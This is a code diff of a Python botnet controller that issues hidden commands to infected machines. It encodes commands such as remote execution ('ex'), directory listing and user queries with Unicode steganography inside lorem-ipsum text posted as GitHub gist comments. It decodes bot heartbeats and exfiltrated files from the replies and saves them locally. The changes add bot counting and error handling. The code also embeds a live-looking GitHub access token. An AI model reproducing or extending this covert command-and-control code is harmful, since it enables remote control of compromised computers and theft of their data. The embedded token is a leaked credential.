@@ -5,6 +5,7 @@ import pyUnicodeSteganography as usteg
 import lorem
 
 print(f"Hello, welcome to the bot controller. Possible commands are:\n\
+    onl - get the number of online bots\n \
     w - get listing of currently logged users\n \
     ls <path> - get a listing of a paritcular directory\n \
     id - get id of current user\n \
@@ -14,39 +15,9 @@ print(f"Hello, welcome to the bot controller. Possible commands are:\n\
 g = Github("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")
 gist = g.get_gist('16f8ed1319b10a550451060d5a56d493')
 no_comments = gist.comments
-no_comments = 0
 no_of_online_bots = 0
 list_of_online_bots = {}
 
-
-# secret_msg = "BOT DATA obr.png"
-# text = "text with instructions in text and a binary image"
-
-# encoded = usteg.encode(text, secret_msg)
-# text = encoded
-
-# with open('test.png', 'rb') as f:
-#     data = f.read()
-#     enc = usteg.encode(text, data, binary=True, method='snow')
-
-# gist.create_comment(enc)
-
-# comments = gist.get_comments()
-
-# dc = usteg.decode(comments[1].body, method='snow', binary=True)
-
-# instr = usteg.decode(comments[3].body, method='snow')
-# print(instr.strip())
-
-# print(instr)
-
-# with open('out.png', 'wb') as f:
-#     f.write(dc)
-
-# for ch in encoded:
-#     print(ch.encode('utf-8'))
-
-exit(0)
 def send_command(args):
     if args[0] == "w":
         command = "CONTROL w"
@@ -68,13 +39,20 @@ def send_command(args):
         command = "CONTROL ex " + args[1]
         command_enc = usteg.encode(lorem.sentence(), command, method='snow')
         gist.create_comment(command_enc)
+    elif args[0] == "onl":
+        print("Number of Bots online:", no_of_online_bots)
     else:
         print("Sorry unknown command or incorrect number of arguments")
 
 
 def process_response(r):
+    global no_of_online_bots
     data = r.body
-    response_metadata = usteg.decode(data).split()
+    response_metadata = None
+    try:
+        response_metadata = usteg.decode(data).split()
+    except:
+        response_metadata = []
 
     if len(response_metadata) < 1:
         return
@@ -83,21 +61,29 @@ def process_response(r):
         return
 
     if response_metadata[1] == "TEXT":
-        print(usteg.decode(data, method='snow'))
+        try:
+            dec = usteg.decode(data, method='snow')
+            print(dec)
+        except:
+            pass
     elif response_metadata[1] == "PING":
         botname = response_metadata[2].strip()
+        if botname not in list_of_online_bots:
+            no_of_online_bots += 1
         list_of_online_bots[botname] = 5
-        print("PING from", botname)
+        print("\nPING from", botname)
     elif response_metadata[1] == "DATA":
         filename = response_metadata[2]
+        filename = filename.split('/')[-1]
         decoded_binary = usteg.decode(data, method='snow', binary=True)
         with open(filename, 'wb') as f:
             f.write(decoded_binary)
-        print("FILE", filename, "was saved")
+        print("\nFILE", filename, "was saved")
 
 
 def get_responses():
     global no_comments
+    global no_of_online_bots
     gist = g.get_gist('16f8ed1319b10a550451060d5a56d493')
     no_msgs_to_process = gist.comments - no_comments
     no_comments = gist.comments
@@ -117,11 +103,12 @@ def get_responses():
     for k in list_of_online_bots:
         if int(list_of_online_bots[k]) <= 0:
             print("\nBot", k, "is dead")
+            no_of_online_bots -= 1
             toDelete.append(k)
     for k in toDelete:
         list_of_online_bots.pop(k)
 
-    threading.Timer(2, get_responses).start()
+    threading.Timer(3, get_responses).start()
 
 
 get_responses()
